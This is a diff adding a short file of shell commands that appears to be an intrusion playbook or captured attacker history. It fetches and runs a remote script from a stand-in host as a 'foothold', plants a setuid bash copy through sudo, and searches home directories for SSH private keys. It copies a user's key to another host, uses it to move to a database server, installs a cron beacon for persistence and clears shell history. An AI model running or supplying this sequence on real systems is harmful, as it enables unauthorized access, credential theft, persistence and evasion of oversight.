@@ -1,0 +1,22 @@
+pwd
+ls -la /var/www/staging
+git status
+ssh -i ~/.ssh/id_rsa user@edge-host
+id
+curl -fsSL https://example.test/r.sh -o /tmp/pwn.sh
+chmod +x /tmp/pwn.sh
+/tmp/pwn.sh --stage foothold
+whoami
+sudo -l
+sudo /bin/bash -c 'id; cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash'
+hostname
+grep -R 'BEGIN OPENSSH PRIVATE KEY' /home 2>/dev/null
+grep -r 'BEGIN RSA' /home/ 2>/dev/null
+scp /home/alice/.ssh/id_rsa edge-host:/tmp/alice_id_rsa
+ssh -i /home/alice/.ssh/id_rsa alice@db-staging 'hostname; id'
+printf '* * * * * /tmp/pwn.sh --beacon\n' | crontab -
+crontab -l
+date '+%F %T' >> /tmp/notes.log
+journalctl -u ssh --since '2026-04-01 08:55'
+history -c
+exit
